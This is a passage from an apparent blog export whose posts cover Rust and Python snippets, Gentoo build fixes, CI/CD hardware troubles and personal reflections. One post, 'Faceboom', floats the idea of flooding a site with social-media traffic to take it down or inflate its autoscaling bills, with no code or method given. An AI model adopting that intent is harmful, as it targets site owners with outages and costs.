\u0026amp;str` Problem here because the compare would try to compare a str with a \u0026amp;str. So what now? I guess the way I loop through Vec, so Instead I’ve tried to use iter().\nBut after working through the line, I noticed that I just build the same compare with a different means… The first mistake was not know how the range loop was working. I had the python range() in mind, however, in rust we need to do this via 0..n. Something easier, but I just forgot.\nAfterwards the loop was working. However, next was that there was an issue adding the _new_data. What did I do wrong? Tinkering around with the if did not solve. So I though maybe that the if was not well and tried to use it with match instead.\nI’m not yet comfortable with the match function of rust. Somehow it does feel that well, even when it seems better than only relying on if statements.\nThat was nice at first. What happened here was that however, _new_data would borrowed, meaning that I have to care for the own ship. For such a small code block that seems a bit too much. Instead, I add a helper variables check that would check before the data are added to the list.\nThe completed function looks like this:\nfor line in 0..data.len() { _new_data = clean_up(data[line]).clone(); let mut _a = _new_data.split(\u0026#34; \u0026#34;); let _interface = _a.next(); let mut check: bool = true; for n_filter_interface in 0..filter_interfaces.len() { if _interface.unwrap().contains(filter_interfaces[n_filter_interface]) { check = false; } } if check == true { data_to_return.push(_new_data); } check = true; } data_to_return The most important lesson her is the use of .contains(). It is a bit like the python if a in b and does match for the pattern, but not exactly. This way i do not need to add any more complex regular expression. It allows a simple and easy filter. It might turn into a problem when the string I try to filter is too ambiguous, but for the moment this should be more than enough.\nDeploying this change also included a bit of a problem. After build and installing it on the VM some strange error happens.\n~# ./NetStats ./NetStats: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33\u0026#39; not found (required by ./NetStats) ./NetStats: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32\u0026#39; not found (required by ./NetStats) What just happened? Searching for this error message does not offer much on the internet. Took me some time to figure it out: I was build on my local laptop for a newer version of glibc than the target system has to offer. I’m uncertain if cargo can define a target glibc, instead, I made it the old school way. Copy the data onto VM and build it there.\nNow the data that are generate only are for existing interfaces and not bridges, docker interfaces of a container. Also, I excluded lo. It reduced that amount of data massively.\nThis also why I need to have a Ci/CD to create a release for different systems.\nSo far,\nakendo\n€ḑit note: I\u0026rsquo;ve found a good explanation for the match() statement on Stack Overflow[0]. The key take away is that match() is used to pattern matching. In my understanding it allows to compare to values disregard of it type. The typical if x == y, however, relies on the same data type, as seen in the error message show above.\n[0] https://stackoverflow.com/a/49889545\n","permalink":"https://blog.akendo.eu/post/2021-04-10-rust-filter/","tags":["Netstat","100DaysToOffload"],"title":"Filtering in rust"},{"categories":["News"],"contents":" How People Learn to Become Resilient | The New Yorker ","permalink":"https://blog.akendo.eu/flash/06.04.2021-linkdrop/","tags":[],"title":"06.04.2021 - link drop"},{"categories":["review"],"contents":"Happy Easter everyone!\nThe past week was rather low in activity due to my health and the health of other around. My health is almost recovered, and I got back to fix things.\nThe good news is, that my infrastructure to run the CI/CD has returned. There are some posts in the pipe about some of the problem I’ve faced during the process.\nBlog CI/CD (Part three) kernel exploration (First chapter completed) PV (Part two) Rust (Part two) nftables Next week I’ll post about this. However, the change in the infrastructure will more overhead. At the moment I have various services that requires some sort of login. I need to harmonize these logins with an LDAP. This is a subject that is on my to-do list for some time now. It is part of the hardening and I do not like to have services with sensible data unhardened on the internet. While at the moment i do not expose anything\u0026rsquo;s, I’m going to update the threat model and make the necessary adjustments.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-04-04-review-cw13/","tags":["100DaysToOffload"],"title":"Review CW13"},{"categories":["Human"],"contents":"Yesterday, I wrote about a conflict with a friend and I like to reflect a bit on. In my experience are personal conflicts never directed towards someone, but toward the hurt feeling.\nWhen you’re in pain it is understood by many that the offender is responsible for the pain and should fix it. But that’s incorrect. By thinking this way you put all the power into the other person. Yet, many expect a specific behavior now.\nHowever, almost always the person did not intend to hurt you nor is he doing this with a purpose in mind. When they try to do, it is often a response to the same problem, they feel hurt and tries to return the favor. This can lead to a cycle of polarization.\nHere is a problem now, because your reality is in mismatch with your expectation, but it is your job to cope with this! The person might have said something you perceive as true, but do not want to be true. We need to understand why or first of let the person know what\u0026rsquo;s going on. Why did it hurt, when did it start to be an issue?\nSaying he’s in the wrong is sometimes necessary. However, the way this is done matters a lot. When you demand resentful for an apology not everyone like do it. Doing this from a perspective of a victim is inferior. We\u0026rsquo;re not on the same level anymore, and it becomes an uphill fight. Because it feels like to submit to from the other side and might cause more distress. I’ve learned lately, that it is important how we do things. More often than I like to.\nIt is part of the coping mechanism we develop over time. The major problem is that needs to be learned. It is a decision however that you’re making after or before a confrontation. The coping mechanism are often part of a bigger decision paths, meaning we’re going through various decision or responses made before the actual encounter. Only a few decisions are made by us in the giving moment.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-04-03-conflict/","tags":["100DaysToOffload"],"title":"Conflict"},{"categories":[],"contents":"Here is a status update: In the last days, I’ve been stay getting healthier and while my physical form became ready, mentally I felt not well enough to write until today. There a several factors that contributed to it.\nFirst the overall situation with COVID-19 is getting to me slowly. So far in my left I wasn’t affected that much, however, not able to travel to my family during Easter causes me stress. Making me sad. Also, when you’re limited in your energy, I have the impression, you’re more often prune to interpersonal conflict too. It was a peculiar moment where a simple question caused my friend to make a ‘drama’ and dragging me down. Drama is maybe not the right word, it was an enlightening conflict that teach me more about humans. But it showed me, that I quite often not understand human behavior or judgement. More often it shows me my inadequacies.\nAnother realization of a source of energy daring for me was that Twitter is just bad. Twitter forester often option clashing and while I enjoy have a direct link to many security researchers, the drama sounding the feeds are more than one can bear. People throw judgement statement at you with questionable perspectives and acting like are doing something good with it. It feels just hypocritical and once the source of drama has been subsided or coped with, the next whisper is right ahead. Causing distraction on every page of the feed. For the moment I decided to pause Twitter for my own sake. However, I might delete my account and replace the following via RSS or something.\nBesides, not much has happened. I guess it is the mid-point break.\n","permalink":"https://blog.akendo.eu/post/2021-04-02-cold-two/","tags":["100DaysToOffload"],"title":"Cold Two"},{"categories":["Blog"],"contents":"Hey everyone,\nunfortunate I turn sick. Last week some relative turn sick and some day later the next one. Since Sunday everyone around here is sick, including me. Hence, I did not manage to write much. I hope to return to blog more often in the next days.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-03-30-cold/","tags":["100DaysToOffload"],"title":"Cold"},{"categories":["News"],"contents":" amd64 17.1 profiles are now stable – Gentoo Linux kernel config protects dmesg \u0026hellip; which group membership allows access / Kernel \u0026amp; Hardware / Arch Linux Forums Apt pinning, install and upgrade Debian packages selectively ","permalink":"https://blog.akendo.eu/flash/29.03.2021-linkdrop/","tags":["Gentoo","Archlinux","dmesg","debian","apt-pinning"],"title":"29.03.2021 - link drop"},{"categories":["CI/CD"],"contents":"Pineview is back online! After some fighting with the routing I got part of my services back online. Biggest pain point was to get the side-to-side vpn up and running. There was a problem that in the past years I had often with Linux and routing. But, I got it solved now.\nI\u0026rsquo;m going blog more about this tomorrow, good night everyone!\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-03-25-pineview/","tags":["100DaysToOffload"],"title":"Pineview"},{"categories":["Habits"],"contents":"Some years ago, a friend of mine went to the Recurse Center[0] in New York. When he returned and told us of all the crazy things. One particular thing was check-ins. When I remember correctly, it was an offered to the others a way to see what there are working on or with. This will be done by writing in short words, what there are working on. Nothing to crazy something like this:\n========== 24.03.2021 ========== *What will I do today* - Blogging - Automate Checkin - Update Tyrorin - Cooking This text will then be shared over some channel in Slack or Mattermost. The advantage of such a thing is, it provides a type of memory of what you have done when. This is especially great when you do pay work and can write down on the end of a month what was done to a particular day of the week.\nUsing Task Warrior to Check-in The process for this is simple: Most of the given tasks are already written down in my Task Warrior. I will just tag a selected task in TW and then read them out. For TW exists a python library that allows to read the data. A quick look through the document and you got everything you need to filter by tags:\nimport tasklib import datetime tw = tasklib.TaskWarrior(data_location=\u0026#39;~/.task\u0026#39;, create=False) checkins = tw.tasks.filter(status=\u0026#39;pending\u0026#39;, tags__contains=[\u0026#39;CheckIn\u0026#39;]) print(\u0026#34;==========\u0026#34;) print(datetime.date.today().strftime(\u0026#34;%d.%m.%Y\u0026#34;)) print(\u0026#34;==========\u0026#34;) print() print(\u0026#34;*What will I do today*\u0026#34;) for task in checkins: print(\u0026#34; - \u0026#34; + str(task)) I sometimes forget, how easy it is to get something done in python. This will loop through all the tasks that have the tag and print them. Reducing the time to write the check considerably. I’ve integrated it with the bash script that handles the file creation. In the future might move this into the script, but for today that’s enough.\nso far,\nakendo\n[0] https://www.recurse.com/\n","permalink":"https://blog.akendo.eu/post/2021-03-24-check-ins/","tags":["Python","Task","Warrior","100DaysToOffload"],"title":"Check Ins"},{"categories":["Gentoo"],"contents":"Today my emerge was complain that it was able to re-emerge app-text/po4a-0.57::gentoo with the follow error message:\nCreated MYMETA.yml and MYMETA.json Creating new \u0026#39;Build\u0026#39; script for \u0026#39;po4a\u0026#39; version \u0026#39;0.57\u0026#39; Created META.yml and META.json Unknown format type: pod. List of valid formats: - asciidoc: AsciiDoc format. - dia: uncompressed Dia diagrams. - docbook: DocBook XML. - guide: Gentoo Linux\u0026#39;s XML documentation format. - ini: INI format. - kernelhelp: Help messages of each kernel compilation option. - latex: LaTeX format. - man: Good old manual page format. - pod: Perl Online Documentation format. - rubydoc: Ruby Documentation (RD) format. - sgml: either DebianDoc or DocBook DTD. - texinfo: The info page format. - tex: generic TeX documents (see also latex). - text: simple text document. - wml: WML documents. - xhtml: XHTML documents. - xml: generic XML documents (see also docbook). - yaml: YAML documents. Died at Po4aBuilder.pm line 161. * ERROR: app-text/po4a-0.57::gentoo failed (compile phase): * Compilation failed * * Call stack: * ebuild.sh, line 125: Called src_compile * environment, line 1095: Called perl-module_src_compile * environment, line 624: Called die * The specific snippet of code: * ./Build build || die \u0026#34;Compilation failed\u0026#34;; I was surprised, because it should have everything in place. After some tinkering around I\u0026rsquo;ve found some issue on github[0]. Ah so I need to upgrade the package?\nEmerging the newer version did not fix the problem. The problem is\u0026hellip;that the dependency is missing!? Wtf? In the ticket there point to the fact that the perl-Pod-Parser, however, it is a virtual package. But re-emerging causes the underlying dependency to be re-install too. Guess what, it wasn\u0026rsquo;t there\u0026hellip;\nemerge -avq virtual/perl-Pod-Parser [ebuild N ] dev-perl/Pod-Parser-1.630.0-r1 USE=\u0026#34;-test\u0026#34; [ebuild R ] virtual/perl-Pod-Parser-1.630.0-r8 Would you like to merge these packages? [Yes/No] yes \u0026gt;\u0026gt;\u0026gt; Verifying ebuild manifests \u0026gt;\u0026gt;\u0026gt; Emerging (1 of 2) dev-perl/Pod-Parser-1.630.0-r1::gentoo \u0026gt;\u0026gt;\u0026gt; Installing (1 of 2) dev-perl/Pod-Parser-1.630.0-r1::gentoo \u0026gt;\u0026gt;\u0026gt; Emerging (2 of 2) virtual/perl-Pod-Parser-1.630.0-r8::gentoo \u0026gt;\u0026gt;\u0026gt; Installing (2 of 2) virtual/perl-Pod-Parser-1.630.0-r8::gentoo \u0026gt;\u0026gt;\u0026gt; Recording virtual/perl-Pod-Parser in \u0026#34;world\u0026#34; favorites file... \u0026gt;\u0026gt;\u0026gt; Jobs: 2 of 2 complete Afterwards, po4a was able to be installed again.\nemerge -avq virtual/perl-Pod-Parser [ebuild N ] dev-perl/Pod-Parser-1.630.0-r1 USE=\u0026#34;-test\u0026#34; [ebuild R ] virtual/perl-Pod-Parser-1.630.0-r8 Would you like to merge these packages? [Yes/No] yes \u0026gt;\u0026gt;\u0026gt; Verifying ebuild manifests \u0026gt;\u0026gt;\u0026gt; Emerging (1 of 2) dev-perl/Pod-Parser-1.630.0-r1::gentoo \u0026gt;\u0026gt;\u0026gt; Installing (1 of 2) dev-perl/Pod-Parser-1.630.0-r1::gentoo \u0026gt;\u0026gt;\u0026gt; Emerging (2 of 2) virtual/perl-Pod-Parser-1.630.0-r8::gentoo \u0026gt;\u0026gt;\u0026gt; Installing (2 of 2) virtual/perl-Pod-Parser-1.630.0-r8::gentoo \u0026gt;\u0026gt;\u0026gt; Recording virtual/perl-Pod-Parser in \u0026#34;world\u0026#34; favorites file... \u0026gt;\u0026gt;\u0026gt; Jobs: 2 of 2 complete Hope that this might help you.\nso far,\nakendo\n[0] https://github.com/mquinson/po4a/issues/142\n","permalink":"https://blog.akendo.eu/post/2021-03-22-fixed-po4a-in-gentoo/","tags":["perl","100DaysToOffload"],"title":"Fixed Po4a in Gentoo"},{"categories":["News"],"contents":" Kira McLean | What I Use Now Instead Of Google ","permalink":"https://blog.akendo.eu/flash/21.03.2021-linkdrop/","tags":[],"title":"21.03.2021 - link drop"},{"categories":["review"],"contents":"Currently, I’ve halted most of these project to favor to get my CI/CD back. In the last days most of the time I’ve had been spent on getting things going again. I have played with some ideas how to do it. Some of you have offered me their support of some type of replacing. Most offers turned out to be not well fit. However, I got some great idea how to replace pineview in the future with. But until I get the money I have to do with something smaller. A VM seems the best option for that time. Everything that I need locally will be put on a Raspberry Pi. I had the hopes up to use an old android phone, because it has more power. But the device flash turns bad. In this project failures are included by default here. ;-)\nBlog CI/CD (Part three) kernel exploration (First chapter completed) PV (Part two) Rust (Part two) nftables I predict, that I can be done until the end of the week. After that I\u0026rsquo;m going back to the normal blogging process, hopefully.\nso far,\nakendo\n€dit: This post had a typo in the date field and was dated for the 212 of March. Lol\n","permalink":"https://blog.akendo.eu/post/2021-03-21-review-cw11/","tags":["100DaysToOffload"],"title":"Review CW11"},{"categories":["Rust"],"contents":"A friend made a question about some rust puns on Twitter[0]. Here is a list of bad rust puns:\nRust to go Rustlessness Rustafari rustikal Rustkyll Rust in the wind ruststätte The Legend of Rust The Lord of the Rusts Rustotopia rustschmerz rustlust Rustmann Rustbill rustgret rustastic rustemblance Rustsucht Rustsüchtig Rusteken Rustecs Urustium [0] https://twitter.com/spacekookie/status/1371940398332006401\n","permalink":"https://blog.akendo.eu/post/2021-03-17-rust-puns/","tags":["100DaysToOffload"],"title":"Rust Puns"},{"categories":["CI/CD"],"contents":"Why is the CI/CD project blocked? Because my server I was running things on broke, and I’m left with a year-old laptop. Technically, it is better than the old server. But, it is only 32-bit. It does not provide 64-bit support and this causes a LOT of trouble.\nWhat type of trouble? Much of the software I use is in container. However, docker have discontinued the native amd64 support. The Same can be said for some distribution like Ubuntu. Debian still have it. But this is not true for many other projects. The biggest surprises is that projects that run with JavaScript do not support i386 anymore. How can that be an issue? Node has stop shipping i386 binaries.\nWhile docker itself does not ship 64-bit packages, Debian does. However, that does not imply that you can run all the containers because these are built for amd64 only. While some containers are with i386 support, the numbers are few. Postgres for instance works fine. Ubuntu on the other hand have stopped to shipping it too.\nThis led to the fact, that many projects my stack is relying on won\u0026rsquo;t work on the old laptop.\nI’ve tried to get some containers going, however, they often depend on some container image, that then depend on a base image. When this is from Ubuntu you only can start to use older release or Debian.\nHere the dependency hell begins. At this point you start to not only port your container to i386 back, but also the container they depend on. This works partly well, however, just because the build script executes, and you’re getting a working image, does not mean that the application is working then.\nSo, you’re not just porting the software of the dependency, you try to fix the build script to cope this. For some that work, but wait. Many maintainers fetch precompiled binaries into the container. Hence, you’re changing this as well.\nAnd when these precompiled binaries are not i386? You can start to build them on your own… Sounds like a good task for a CI/CD, expect it is to get my CI/CD started in the first place….\nI\u0026rsquo;ve spent some hours on this, and I’m sure to get it going. Yet, it costs too much and represents rather a sunken cost fallacy.\nMany of the data I do not wish to put into a cloud. However, this is for the moment the best solution until I can afford a suitable replacement.\nSo far, akendo\n","permalink":"https://blog.akendo.eu/post/2021-03-16-dependency-hell/","tags":["docker","i386","100DaysToOffload"],"title":"Dependency Hell"},{"categories":["Software"],"contents":"For long, I\u0026rsquo;ve used the Habit Tracker[0] to keep track of my daily routines. A while ago, I\u0026rsquo;ve decided to stop using my Smartphone to reduce distracting. Instead, the task warrior has become my tool to keep track of daily routines. This comes with some downsides. I do not have that neat graphs anymore.\nTo compensated, I’ve taken some time to figure out how the App is rendering the graph. After some search, I think I manage to find the formula that is used to compute the score value of a given habit. When we know this value, we can be used to generate an own graph.\n$$s = 0.5^{\\frac{\\sqrt(f)}{13}}$$\nWait, what? \\(0.5^{\\frac{\\sqrt{f}}{13}}\\) ? That’s an odd function. I have to admit, it took some time until I understood what the idea is. This is a graceful descending graph. The function will hit zero eventually. Important is the follow quote[2] here:\n* Given the frequency of the habit, the previous score, and the value of * the current checkmark, computes the current score for the habit. * * The frequency of the habit is the number of repetitions divided by the * length of the interval. For example, a habit that should be repeated 3 * times in 8 days has frequency 3.0 / 8.0 = 0.375. */ A little bit below we can see the computation that is made:\nval multiplier = Math.pow(0.5, sqrt(frequency) / 13.0) var score = previousScore * multiplier score += checkmarkValue * (1 - multiplier) return score I wasn’t able to find any specify documentation within the project why this formula is the way it is. Habits require a certain amount of reiteration before it becomes a true habit. It might be that one of the paper that state this has made up this formula and the developer has adapted it. It could be also possible, that it was completely invented by him? I\u0026rsquo;m not certain.\nHow I understood the code is as follows: You compute for a fixed sized interval the number of repetitions. How often should you do this giving habit per week? In the graph on top of the page, we see the different interval lengths that available. There are fixed for weeks, months or years, when I remembered correctly. In the example the interval is 8 days what feels arbitrary, but it is just an example. Anyway, we then have the frequency.\nAt this point I’m a bit uncertain in how the app counts the actual number of repetitions. It could be that the frequency is a fixed value and the app computed via the value for a checkmark. Or it, changes frequency by calculate the actual repetitions one has done per interval into. It makes more sense to me that it is mainly done via the checkmark value because it is boolean.\nOne thing that left me to wonder is the 13[3]? Why 13? I guess to represent the period something take until it becomes really a habit. When you remove it, it takes five days. I wrote the code in python to imitate it, but left the 13 as a factor away.\ndef score(frequency,previousScore, Value): multipler = math.pow(0.5, math.sqrt(frequency)) score = previousScore * multipler score += Value * (1 - multipler) return score Now we loop through and see:\nIt is day 0 Score is 0.5 It is day 1 Score is 0.75 It is day 2 Score is 0.875 It is day 3 Score is 0.9375 It is day 4 Score is 0.96875 It is day 5 Score is 0.984375 The formula converging against 1, but will never reach 1. This make sense because it represents percentage. Besides, when it has reached 0.99 it does not matter anyway, you would count it as 100%. We may keep playing with the code until we see the period in which a habit becomes habitual. This is fun because usually, we do not tinker with mathematical formula this way.\nIt also raises some concern here. Think about it, some people that use this app taking this as an indicated without understanding why it is this way. For them, it is just like: Hey here is a graph, and it looks great. Let this becomes a metric for this routine now. Yacs…\nBrowsing through the code base and I must say, Kotlin feels odd. However, this project is especially useful to learn from because it covers different platforms. I think that the code is organized as follows: A core part written in java to allow cross-platform support and then platform specify code. For instance, iOS or Android. It also has some web and server related resources. This make sense to keep the code arranged this way. I did just not expect this.\nAny way, that it for now.\nSo far, akendo\n[0] https://f-droid.org/en/packages/org.isoron.uhabits/\n[1] https://github.com/iSoron/uhabits/blob/2828dfcc754ee09a5e1c03fb96986b71d0686af1/uhabits-core/src/jvmMain/java/org/isoron/uhabits/core/models/Score.kt#L43\n[2] https://github.com/iSoron/uhabits/blob/2828dfcc754ee09a5e1c03fb96986b71d0686af1/uhabits-core/src/jvmMain/java/org/isoron/uhabits/core/models/Score.kt#L35\n[3] https://github.com/iSoron/uhabits/search?q=13\n","permalink":"https://blog.akendo.eu/post/2021-03-15-habit-score/","tags":["Habit","TaskWarrior","100DaysToOffload"],"title":"Habit Score"},{"categories":["CI/CD"],"contents":"I’ve been working on my CI/CD system and because the firmware update went bad I had to dissemble the device and attach to the SPI Chip. Unfortunate, the chip seems to be broken. I wasn’t able to get any data back from the chip. There is also the option that the wiring of the Clamps is faulty, however, I duplicated it from a photo where I knew that it was working. Disregard, I do not have any device I can run my CI/CD things on at the moment and need to think what needs to be done next.\nThis is frustrating in many ways. The device that could act as a substitute only has 32-Bit and porting docker container from 64-Bit to 32-Bit is a solution. Currently, I have no good idea of how to cope with this.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-03-15-broken-spi/","tags":["100DaysToOffload"],"title":"Broken SPI Chip"},{"categories":["review"],"contents":"Another week has gone by, and I did not get that much done as I was hoping for. However, I manage to push my fiftieth post this year! That quite a lot. I intended to do be done by around April, this wouldn\u0026rsquo;t be the fact. Nevertheless, it is going better than planned.\nBlog CI/CD (Part three) kernel exploration (First chapter completed) PV (Part two) Rust (Part two) nftables Most of the little time I had gone into the CI/CD problem. Currently, I’m blocked and this is quite frustrating. Going to re-direct my efforts and getting some VMs up instead.\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-03-14-review-cw10/","tags":["100DaysToOffload"],"title":"Review CW10"},{"categories":["Linux"],"contents":"To see how much people reading this blog I utilize goaccess[0]. It provides some neat feature, but mostly I check for the report at the moment. While having ‘real-time’ stats seems nice, I do not care for them.\nIt also allows combining access and error logs or ignore crawler. The command to do so is fairly simple:\ngoaccess access.log --log-format=COMBINED --ignore-crawlers -a -o report.html so far,\nakendo\n[0] https://goaccess.io/\n","permalink":"https://blog.akendo.eu/post/2021-03-12-goaccess/","tags":["100DaysToOffload"],"title":"Goaccess"},{"categories":["News"],"contents":" Should I quit video games? How to be more productive without forcing yourself Why There’s No Such Thing as a ‘Startup Within a Big Company’ | by Hunter Walk | Feb, 2021 | Marker You Should Keep a Journal | Saylornotes ","permalink":"https://blog.akendo.eu/flash/10.03.2021-linkdrop/","tags":[],"title":"10.03.2021 - link drop"},{"categories":[],"contents":"I’m reading a text about quitting video games[0]. I think he has some good points, but makes also quite generic statement. However, I like to quote an important thing:\nSecondly, if we’re never bored, we get used to being constantly mentally stimulated and other parts of our lives will seem way more boring (read about dopamine stimulation standard here). The best example of this is when you view all the conversations with other people as boring, except for talking to gamers about your game.\nI wondered about this posts in general, because I think you can translate it to many other topics too. Hacking, watching television or board games. This might be related to the underlying problem in the human nature. This is why technologies is a problem in our lives. It draws the attention away from what matters and creates a dangerous distraction.\nIt could be applied to other domains too, to have it only to gaming seems a bit aggregated. But it makes sense and shows how the human minds. The underlying problem is the ability of humans to cope with their emotions. This makes it often difficult for us to related to others. Hence, we’re looking for a subject that causes us emotion. When you get absorbed in a single subject completely, it is the only source of emotions. We stand still.\nIt is important to not become fixed on a single subject in life. Disregard if this is hacking, gaming or even spirituality. I remember one keynote on a hacker conference in which the speaker noted that his two-year-old daughter did not recognize him because he spent so much time hacking that he had barely made a connection to her. With Workaholics, it is the same as it is with every form of extremism. We can become equality absorbed by activism and with a defining narrative[2] it becomes dangerous.\nSo far, akendo\n[0] https://www.deprocrastination.co/blog/should-i-quit-video-games [1] https://blog.akendo.eu/post/2021-01-21-defining-narrative/\n","permalink":"https://blog.akendo.eu/post/2021-03-10-about-gaming/","tags":["100DaysToOffload"],"title":"About Gaming"},{"categories":["News"],"contents":" The benefits of note-taking by hand - BBC Worklife ","permalink":"https://blog.akendo.eu/flash/09.03.2021-linkdrop/","tags":[],"title":"09.03.2021 - link drop"},{"categories":["Security"],"contents":"You may or may not have heard from the ‘Slashdot effect’[0]. In short: it is the effect that when a public news site has a post that links to the content of a small website. The websites will be suddenly hit with a massive number of requests and consequently collapses. You could say it is a DDoS by legitimate users.\nI always wanted to capitalize on this. Here is the idea, a program that pushes some content to millions of users via Facebook to take it down. It wanted to call it Faceboom.\nThe only one downside to it. I’m not using Facebook and frankly at this point I do not care for it. It would require some more effort to make this useful. Because to be more naughty, I want aim to not just take down the site, but also causes more costs. When a victim relies on dynamic scaling[1] you can increase the cost and the worst would be to keep that traffic high enough to increase the costs to max without taking the website down.\nHow should look this? First you would have to find anyone using this. That might be difficult. How would you make millions of people click the website? I don’t know…\nso far, akendo\n[0] https://en.wikipedia.org/wiki/Slashdot_effect [1] https://en.wikipedia.org/wiki/Autoscaling\n","permalink":"https://blog.akendo.eu/post/2021-03-08-faceboom/","tags":["100DaysToOffload"],"title":"Faceboom"},{"categories":["reviews"],"contents":"Gosh, I’ve manage to not get any post done in a week!? Yeah. But I took a pause from blogging. I’ve been bogging since the beginning of the year almost every day. This break was not deliberately, however, it was necessary.\nSo, I’m going to resume blogging in the next week, hopefully. Nothing much to add to this today.\n","permalink":"https://blog.akendo.eu/post/2021-03-07-review-cw09/","tags":["100DaysToOffload"],"title":"Review CW09"},{"categories":["reviews"],"contents":"This week was the best so far. I finished up the kernel exploration and will move next week to the next chapter. I’ve found the time to work on the Rust subject. However, it is not the subject I wanted to write. However, as long as pineview is down I cannot access my hackmd instance where much of the post lies in. Instead, I wrote about my first program written in rust and how it will be improved. But I’ve learned much again and that make some happy:\nBlog CI/CD (Part three) kernel exploration (First chapter completed) PV (Part two) Rust (Part two) nftables nftable sufferers a bit at the moment, however, I was in such a good mode that I completed the kernel exploration at once. So hope to see here a bit more. Pineview on the other hand will be restored hopefully this week allow me to continue on the CI/CD more seriously. The next week I have not that time as this week, hence, my writing will be lowered. At this point, including this post, I have 46 posts made in this year! So, things are going well.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-02-28-review-cw08/","tags":["100DaysToOffload"],"title":"Review CW08"},{"categories":["Rust"],"contents":"Here is the next part of my StopClock post that I’ve made yesterday[0].\nWarning two: unnecessary parentheses warning: unnecessary parentheses around `if` condition --\u0026gt; src/main.rs:14:8 | 14 | if (args.len() == 2) | ^^^^^^^^^^^^^^^^^ help: remove these parentheses | = note: `#[warn(unused_parens)]` on by default This seems like bash or something? Why did I add these parentheses? The default if else case does not require them. Here is an example: if n \u0026lt; 10 \u0026amp;\u0026amp; n \u0026gt; -10 [1]. No parentheses. It does not stop only on this line.\nwarning: unnecessary parentheses around `while` condition --\u0026gt; src/main.rs:37:15 | 37 | while (remaining_time \u0026gt;= MINUTE as u64){ | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ help: remove these parentheses | = note: `#[warn(unused_parens)]` on by default warning: unnecessary parentheses around `while` condition --\u0026gt; src/main.rs:46:14 | 46 | while(minutes_remaining != time_as_minutes) | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ help: remove these parentheses This seems like a C related syntax mistake[3].\nWarning three: unused variable --\u0026gt; src/main.rs:16:11 | 16 | let name = \u0026amp;args[0]; | ^^^^ help: if this is intentional, prefix it with an underscore: `_name` | = note: `#[warn(unused_variables)]` on by default warning: unused variable: `time_to_sleep_arg2` --\u0026gt; src/main.rs:24:11 | 24 | let time_to_sleep_arg2 = \u0026amp;args[1]; | ^^^^^^^^^^^^^^^^^^ help: if this is intentional, prefix it with an underscore: `_time_to_sleep_arg2` | = note: `#[warn(unused_variables)]` on by default This is simple, remove these, and we’re good to go.\nWarning four: unused std::result::Result that must be used warning: unused `std::result::Result` that must be used --\u0026gt; src/main.rs:53:9 | 53 | / Command::new(\u0026#34;/usr/bin/notify-send\u0026#34;) 54 | | .args(\u0026amp;[\u0026#34;-u\u0026#34;, \u0026#34;normal\u0026#34;, \u0026#34;-t\u0026#34;, \u0026#34;15000\u0026#34;, \u0026#34;StopClock\u0026#34;, \u0026#34;Times up!\u0026#34;]) 55 | | .output(); | |__________________________^ | = note: `#[warn(unused_must_use)]` on by default = note: this `Result` may be an `Err` variant, which should be handled warning: unused `std::result::Result` that must be used --\u0026gt; src/main.rs:58:9 | 58 | / Command::new(\u0026#34;/usr/bin/mplayer\u0026#34;) 59 | | .args(\u0026amp;[\u0026#34;-volume\u0026#34;,\u0026#34;50\u0026#34;, \u0026#34;/home/akendo/Downloads/end.mp3\u0026#34;]) 60 | | .output(); | |___________________________^ | = note: this `Result` may be an `Err` variant, which should be handled warning: 3 warnings emitted Oh boy, that’s a more difficult one, but a good warning indeed.\nWhat we’re going to do for the moment is to add a .unwrap() to ignore that cases. However, we’re adding To-Do for later to handles some testing before executing. The main problem here is that we’re relying on external files. When these files or program are absence we will run into error. Hence, create some error cases for such a situation seems reasonable.\nWhen i frist wrote rust I did not understood the concepct of Result[4]. Therefor this error message did not made any sense.\nIn my understanding now, Result is similar to Option and therefore a handler of failure. The problem is that not every function can succeed all the time. Option is useful to have something that will be returned while Result is the high-level option that only case for success or not.\nErr of Result should indicate to the user what the error was and how to potentially resolve it. I think the Python pardon would be a try block. The Result would be the raise function.\nAny way, that’s it for today.\nSo far, akendo\n[0] https://blog.akendo.eu/post/2021-02-26-rust-stopclock/ [1] https://doc.rust-lang.org/rust-by-example/flow_control/if_else.html [2] https://doc.rust-lang.org/std/keyword.while.html [3] https://www.tutorialspoint.com/cprogramming/c_while_loop.htm [4] https://doc.rust-lang.org/std/result/enum.Result.html\n","permalink":"https://blog.akendo.eu/post/2021-02-27-rust-stopclock-part-two/","tags":["stopclock","100DaysToOffload"],"title":"StopClock Part Two"},{"categories":["Rust"],"contents":"For a long time now I wanted to do more rust related content. I have quite some ideas up mys sleeve, however, where to start? Because It has been a while that I did some coding I’ve decided to return to the roots or rather to my first written rust program. StopClock.\nThe name is terrible and not in the rust typical favor. However, this little program has become significant to me. I use it almost every day to get myself on a task or to tell me when something is over. Even now it tells me when the next focus time is over.\nHere it is:\nextern crate datetime; use std::env::args; use std::{thread, time}; use std::process::Command; use datetime::{LocalDate, Month, DatePiece}; const MINUTE: u64= 60; fn main() { let args: Vec\u0026lt;String\u0026gt; = args().collect(); if (args.len() == 2) { let name = \u0026amp;args[0]; let time_to_sleep_arg = \u0026amp;args[1].clone(); // This create some odd situation. you\u0026#39;ll be hit with a Result\u0026lt;T,E\u0026gt; document. // not quite sure how to handle this. Seems like a struct with the std::String:Result // The main question is, how to get this right? // With Beni: // unwrap() would be possible // The error is i use collect and trigger some nosense. let time_to_sleep_arg2 = \u0026amp;args[1]; println!(\u0026#34;Going to sleep for: {} seconds at .\u0026#34;, time_to_sleep_arg); let time_to_sleep :u64 = match time_to_sleep_arg.trim().parse() { Ok(v) =\u0026gt; v, Err(_) =\u0026gt; {panic!(\u0026#34;Sorry we need to have number only\u0026#34;)}, }; let mut remaining_time = time_to_sleep; let mut time_as_minutes = 0; while (remaining_time \u0026gt;= MINUTE){ remaining_time = remaining_time - MINUTE; time_as_minutes = time_as_minutes + 1; } println!(\u0026#34;More than 1 Minute!\u0026#34;); println!(\u0026#34;Going to sleep for {} Minutes!\u0026#34;, 